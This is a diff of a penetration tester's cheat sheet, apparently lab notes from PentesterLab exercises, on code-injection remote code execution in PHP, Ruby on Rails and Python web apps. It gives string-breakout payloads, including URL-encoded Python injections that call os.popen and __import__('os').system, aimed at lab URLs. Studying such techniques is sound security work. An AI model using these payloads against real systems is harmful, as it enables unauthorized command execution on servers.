@@ -1,30 +1,44 @@
+IMPORTANT --> Testing paramaters:
+either " or '
+
 PHP:
 1. Using string concatenation to execute code
-Lets say you have a code like
-<?php
-system("ls")
-?>
-You can exploit the following with concatenation, with the following payload, the quote in the beginning is to end the previous command:
-".system('ls')";#
+    Lets say you have a code like
+    <?php
+    system("ls")
+    ?>
+    You can exploit the following with concatenation, with the following payload, the quote in the beginning is to end the previous command:
+    ".system('ls')";#
 
-Note: Url encode endline character and hash sign
+    Note: Url encode endline character and hash sign
 
 
-Ruby on rails:
+1. Ruby on rails:
 Always remember --> EVAL IS EVIL
 
-1. RCE via EVAL
-Reference:https://pentesterlab.com/exercises/codexec_05/course
+    1.1 RCE via EVAL
+    Reference:https://pentesterlab.com/exercises/codexec_05/course
 
-Inject the following in the parameter:
+    Inject the following in the parameter:
 
-myuser"+`uname`+"
+    myuser"+`uname`+"
 
-Here, we will need to do the following:
+    Here, we will need to do the following:
 
-    A double-quote " to break out of the string.
-    Add a + sign for string concatenation (don't forget to URL-encode it)
-    Add a call to the command ([COMMAND]) we want to run using `[COMMAND]`.
-    Add another + sign for string concatenation.
-    Another double-quote " to close the one that was already there.
+        A double-quote " to break out of the string.
+        Add a + sign for string concatenation (don't forget to URL-encode it)
+        Add a call to the command ([COMMAND]) we want to run using `[COMMAND]`.
+        Add another + sign for string concatenation.
+        Another double-quote " to close the one that was already there.
 
+1. Python
+
+1.1 RCE via python
+Can be leveraged via paths(http://ptl-70f1ff3f-c279b528.libcurl.so/hello/hacker%60%22%2bstr(True)%2b%22test%60) and parameters
+Payload to test: `"%2bstr(True)%2b"test`
+Vulnerable signs: The text shows up
+Reading back the response, the following can be used:
+the last payload can be used --> `"%2bstr(os.popen('ls').read())%2b"test`
+
+   - Importing COMMAND EXECUTION LIBRARIES, EXAMPLE:
+    http://ptl-2b1e84c7-91eb1656.libcurl.so/hello/hacker%22%2bstr(__import__('os').system('id'))%2b%22
